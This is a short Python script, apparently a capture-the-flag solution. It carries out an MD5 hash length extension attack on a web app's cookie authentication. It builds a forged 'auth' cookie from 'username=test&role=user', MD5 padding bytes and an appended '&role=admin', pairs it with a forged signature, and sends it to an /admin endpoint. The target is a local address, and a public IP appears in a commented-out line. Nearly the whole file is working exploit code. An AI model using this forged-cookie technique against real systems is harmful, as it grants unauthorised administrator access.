#coding:utf-8
'''
Created on Mar 19, 2019

@author: sherl
'''
import requests,sys,os
import hashlib
from urllib.parse import  *
import os.path as op

headers = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}
#tarurl=r'http://101.201.66.182:8012/admin'
tarurl=r'http://127.0.0.1:8012/admin'

strang_auth='username=test&role=user'
strang_sig='5b8f99d780ec542da912a5a5cf2bc341'

fake_auth='username=test&role=user'
fake_sig='484543d217ceab81282abf65fec74721'


#sec(7) + 23 + 1+ 25+ 1 + 7 + 10 = 74
#cookies={"auth": 'username=test&role=user'+'%80'+'\x00'*25+'\x1e'+'\x00'*7+'&role=admin',       "sig": '51c541a5a6a17b50f25ade0192a33dfe'}
cookies={"auth": 'username=test&role=user'+'%80'+'\x00'*25+'\x1e'+'\x00'*7+'&role=admin',       "sig": '1e4714d24c3dcfa82fe64891773b4f11'}


print (cookies)
print (len(cookies['auth']))

s=requests.session()



r = s.get(tarurl,headers=headers, cookies=cookies) #


print (r.cookies)
print (r.status_code,r.text[:100])


test_quote=cookies['auth']
auth_byte=unquote_to_bytes(test_quote)
print ('auth unquote len:',len(auth_byte))
print ((auth_byte))


auth_byte=unquote_to_bytes(cookies['sig'])
print ('\nsig unquote len:',len(auth_byte))
print ((auth_byte))



#print (hashlib.md5(b'username=test&role=user').hexdigest().encode())




if __name__ == '__main__':
    pass